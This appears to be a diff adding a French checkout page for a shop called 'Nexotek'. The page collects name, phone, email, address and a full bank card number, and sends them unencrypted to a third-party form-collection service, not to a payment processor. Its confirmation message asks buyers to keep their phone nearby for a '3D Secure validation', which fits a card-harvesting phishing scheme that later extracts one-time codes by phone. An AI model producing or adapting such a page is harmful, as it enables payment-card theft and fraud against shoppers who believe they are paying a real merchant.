@@ -1,0 +1,122 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paiement - Nexotek</title>
+  <link rel="stylesheet" href="styles.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: white;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 20px;
+      background-color: #1a1a1a;
+      border-radius: 8px;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 15px 0 5px;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 4px;
+      border: none;
+      margin-bottom: 10px;
+    }
+    .total {
+      font-size: 18px;
+      margin-top: 10px;
+      text-align: right;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #00aaff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #008ecc;
+    }
+    .confirmation {
+      margin-top: 30px;
+      padding: 20px;
+      background-color: #2a2a2a;
+      border-radius: 6px;
+      text-align: center;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 150px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="logo.png" alt="Logo Nexotek" class="logo" />
+    <h1>Finaliser votre commande</h1>
+    <form method="POST" action="https://formspree.io/f/mvgapayj">
+      <label for="fullname">Nom complet</label>
+      <input type="text" id="fullname" name="Nom complet" required />
+
+      <label for="phone">Téléphone</label>
+      <input type="tel" id="phone" name="Téléphone" required />
+
+      <label for="email">Adresse e-mail</label>
+      <input type="email" id="email" name="Email" required />
+
+      <label for="address">Adresse de livraison</label>
+      <input type="text" id="address" name="Adresse" required />
+
+      <label for="quantity">Quantité (max 5)</label>
+      <select id="quantity" name="Quantité" onchange="updateTotal()" required>
+        <option value="1">1</option>
+        <option value="2">2</option>
+        <option value="3">3</option>
+        <option value="4">4</option>
+        <option value="5">5</option>
+      </select>
+
+      <label for="card">Numéro de carte bancaire</label>
+      <input type="text" id="card" name="Carte bancaire" required />
+
+      <div class="total">Total : <span id="total">119</span> €</div>
+      <button type="submit">Procéder au paiement</button>
+    </form>
+
+    <div class="confirmation" id="confirmation">
+      <h2>Merci pour votre commande !</h2>
+      <p>Nous avons bien reçu vos informations.</p>
+      <p>Le traitement de votre paiement va commencer et peut prendre entre 10 à 15 minutes via notre prestataire agréé.</p>
+      <p>Vous pouvez maintenant quitter le site, mais merci de garder votre téléphone à proximité au cas où une validation 3D Secure serait nécessaire.</p>
+      <p>Dès que votre paiement est validé, vous recevrez automatiquement votre facture ainsi que les informations de livraison par email.</p>
+      <p>Nous restons à votre disposition si besoin. Merci pour votre confiance.</p>
+    </div>
+  </div>
+
+  <script>
+    function updateTotal() {
+      const price = 119;
+      const quantity = document.getElementById("quantity").value;
+      document.getElementById("total").textContent = price * quantity;
+    }
+  </script>
+</body>
+</html>
